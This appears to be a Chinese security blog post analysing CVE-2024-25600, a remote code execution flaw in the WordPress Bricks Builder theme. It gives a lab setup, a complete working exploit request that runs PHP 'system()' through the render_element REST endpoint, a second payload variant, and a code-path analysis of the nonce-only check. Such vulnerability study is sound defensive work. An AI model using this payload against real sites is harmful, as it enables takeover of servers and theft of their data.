#  CVE-2024-25600：WordPress Bricks Builder RCE   
 白帽子   2024-11-16 16:14  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！作者：良夜@Timeline Sec 本文字数：3434阅读时长：3～5mins声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
Bricks Builder 是一个 WordPress 页面构建插件，它的主要功能是让用户可以通过直观的界面和拖放操作来创建自定义的网页布局。使用 Bricks Builder，用户可以轻松地设计和定制其网站的页面，而无需编写任何代码。  
## 0x02 漏洞概述  
  
**漏洞编号：CVE-2024-25600**  
  
WordPress配置安装的Brick Builder主题存在远程代码漏洞。攻击者可通过/wp-json/bricks/v1/render_element 接口中直接提交代码即可在目标执行任意代码，进而控制目标服务器。  
## 0x03 影响版本  
  
Brick Builder <= 1.9.6  
## 0x04 环境搭建  
  
本地搭建如下：（比较简单不详细叙述了）  
  
下载Bricks Builder：  
  
参考 https://www.pythonthree.com/free-download-bricks-builder/  
  
下载WordPress下载地址：https://github.com/WordPress/WordPress/releases/tag/6.4.3  
  
安装一个phpstudy，并启动，将下载的wordpress解压到WWW目录下  
  
访问 http://localhost/WordPress-6.4.3/ 自动跳转到安装界面，设置数据库，在这注意要手动新建一个数据库。  
  
安装好后登录后台，上传主题并安装启用  
## 0x05 漏洞利用  
  
指纹特征：body中包含/wp-content/themes/bricks/  
  
首先需要得到 nonce，直接访问网站即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEE15pGWdLJfws0eSFTzYOo7NwKJibJOT5ksT677uYNu0nrnVicFECoPTnQ/640?wx_fmt=png&from=appmsg "")  
  
然后就可以构造POC,执行代码了  
```
POST /WordPress-6.4.3/wp-json/bricks/v1/render_element HTTP/1.1
Host: localhost
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 295

{
"postId":"1",
"nonce":"69d17dbdfd",
"element":{
    "name":"container",
    "settings":{
        "hasLoop":"",
        "query":{
            "useQueryEditor":true,
            "queryEditor":"system('calc');throw new Exception();", 
            "objectType":""
        }
    }
}
}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEVQKRthRBnupUwc76KOZD4NQcX8MqHRUxZAlsicLE6krTpKfQJEWDFVg/640?wx_fmt=png&from=appmsg "")  
## 0x06 漏洞分析  
  
首先看下漏洞触发的具体位置，位于\wp-content\themes\bricks\includes\query.php中prepare_query_vars_from_settings函数中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEGIJlGYU9qZVkXJ5tsaRPicjYpIw5pMwp4bOfzd9TPH9TSL9ASMygnYA/640?wx_fmt=png&from=appmsg "")  
这段代码被用来执行用户提交的 PHP 代码并返回执行结果，通过构造的POC，输入的代码将在这里执行。  
  
向上分析一下，$php_query_raw参数是怎么来的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEExQgac7IXVjPn8EibfLX4icmxJ2Nw6CqRNVf0VmH9NcFYhXTzZAIAQCEQ/640?wx_fmt=png&from=appmsg "")  
$php_query_raw由bricks_render_dynamic_data( $query_vars['queryEditor'], $post_id );得到,bricks_render_dynamic_data函数用来执行数据渲染操作，而$query_vars['queryEditor'] 是一个存储动态数据配置的数组，该数组包含了查询参数和条件。$post_id 是当前页面或发布的 ID，用于指定要渲染动态数据的特定页面或发布。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEia000fiahQNWcpRmECIwvY8Y8FO1ibn2vmp0qxicSBhUclgiczRbgaGbh1w/640?wx_fmt=png&from=appmsg "")  
  
$query_vars由传入的settings形参得来。全局搜索一下调用了 prepare_query_vars_from_settings 方法的地方  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEr4D951icXVbLRjhLGz6XmibPlfkG7RhiaZ18icsGjUxl6xiaDZtBk61LG6A/640?wx_fmt=png&from=appmsg "")  
可以看到query.php的Query类构造函数（__construct）能够直接触发prepare_query_vars_from_settings，需要的条件是进入else循环中，也就是element数组中的id的值为空即可。  
  
同时如果要想成功执行代码则还需要两个条件  
  
1.在element参数下setting参数下的query参数下，设置参数queryEditor为我们rce代码  
  
2.在element参数下setting参数下的query参数下，要有参数useQueryEditor  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEE067afDN5GuXibiadceTVbbHGIlNLbibl2Ho7thp1pj1CCndnYzDtOpsYw/640?wx_fmt=png&from=appmsg "")  
  
构造函数自动执行的前提是所在的类被实例化，继续搜素，看在哪里会实例化Query类  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEvFEibkXwicNeI96dzS9BDiaWeOibcPZRFFeibkREQzrYXmpgV3l7Q20DMOA/640?wx_fmt=png&from=appmsg "")  
  
在ajax.php#render_element中存在Query的实例化，需要的条件就是$loop_element为false，而其初始值为false，这里设置了ajax与rest api这两种请求方式。非ajax请求element参数下没有参数loopElement,$loop_elemet 将被置为 false ，即保证POST请求中保持没有loopElement即可保持为false。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEE0ZGSuwUhQkcM9H6sZq60icJFL5JqnITVkspPiaMc5O5dHUtibhQyI6uHg/640?wx_fmt=png&from=appmsg "")  
  
接着往下看，这里需要注意一个地方，这里它会从elements中获取name，并且通过name 获取一个类，判断这个类是否存在，如果不存在会抛出doesn't exist内容，从而导致RCE失败  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEjpYwPwTqWSY4TJ8K27HMWyJaeNBMMiaXIYK4o7DpibcndlYFYGXEnicdQ/640?wx_fmt=png&from=appmsg "")  
  
在elements.php中，初始化定义了很多name的名称，理论上这些初始化定义的应该都是存在可用的，因此POC里面的name也可以是 section、block、div等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEDD0icVJIia8aYTU8fn7VXbIR8okolZ5awEWOFLIib8geB0ibpKWHDnX0ibg/640?wx_fmt=png&from=appmsg "")  
  
继续搜render_element的调用方法,发现在api.php中存在命名相同的方法调用了Ajax#render_element，这里的api.php实际上是一个处理注册的 REST API 端点之一的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEhVRdEUpKGYRj7SksMvOIHRxvf7N79lb21NlHvln4APTGJfz00N0tpQ/640?wx_fmt=png&from=appmsg "")  
  
继续搜索调用，找到在它的自定义初始化端点函数，从中可以看到它定义了很多能够注册的REST路由，API_NAMESPACE的值就是/bricks/v1/，通过后面拼接某个字符串的方式触发对应的callback回调函数以及权限检查。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEETQBDJZGEic3nAe50WQupuOUl9YM3FjibOiaJQA9XsvgBWAdiaJ4gzRnC0g/640?wx_fmt=png&from=appmsg "")  
  
这里的render_element_permissions_check就是检查nonce随机数，但只检查了随机数的值，但是没有检查用户的权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjqibWS3OqfuqpicqVMkaZmEEdzYkIQBjTY5mCjkfmkWSAQ2N9XOjPvKNFwoYwQiaGuYNYKPmlOngnOA/640?wx_fmt=png&from=appmsg "")  
  
因此payload可以构造为  
```
{
"postId":"1",
"nonce":"6e5b5ffb32",
"element":{
    "name":"div",
    "settings":{
        "hasLoop":"",
        "query":{
            "useQueryEditor":true,
            "queryEditor":"system('calc');throw new Exception();", 
            "objectType":""
        }
    }
}
}

```  
## 0x07修复方式  
  
Bricks Builder 版本 1.9.6.1 或更高版本中已发布解决此漏洞的补丁。  
## 参考连接  
  
https://github.com/Chocapikk/CVE-2024-25600  
  
https://blog.csdn.net/shelter1234567/article/details/136503993  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题  
  
回复  
【手册】  
获取原创技术PDF手册  
  
回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】  
获取TimelineSec创办的实战课程  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就点个赞吧！  
  
欢迎评论区留言讨论～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
